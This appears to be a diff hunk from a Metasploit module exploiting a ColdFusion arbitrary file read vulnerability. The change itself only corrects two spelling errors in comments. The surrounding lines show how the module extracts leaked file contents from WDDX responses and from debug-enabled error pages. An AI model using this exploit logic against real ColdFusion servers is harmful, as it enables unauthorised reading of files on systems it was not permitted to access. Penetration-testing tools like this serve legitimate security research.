@@ -103,14 +103,14 @@ class MetasploitModule < Msf::Auxiliary
       file_data = res.body[res.body.index(wddx_packet_tag) + wddx_packet_tag.length..]
 
       # If the default CFC options were used, we know the output will end with the result of calling wizardHash. So we can
-      # remove the result which is a SHA1 hash and two 32 byte random strings, comma seperated and a trailing space.
+      # remove the result which is a SHA1 hash and two 32 byte random strings, comma separated and a trailing space.
       if datastore['CFC_ENDPOINT'] == '/CFIDE/wizards/common/utils.cfc' && datastore['CFC_METHOD'] == 'wizardHash'
         file_data = file_data[0..file_data.length - (40 + 32 + 32 + 2 + 1) - 1]
       end
     else
       # ColdFusion has a non-default option 'Enable Request Debugging Output', which if enabled may return a HTTP 500
       # or 404 error, while also including the arbitrary file read output. We detect this here and retrieve the file
-      # output which is pre-pended to the error page.
+      # output which is prepended to the error page.
       request_debugging_tag = '<!-- " ---></TD></TD></TD></TH></TH></TH>'
 
       if res && (res.code == 404 || res.code == 500) && (res.body.include? request_debugging_tag)
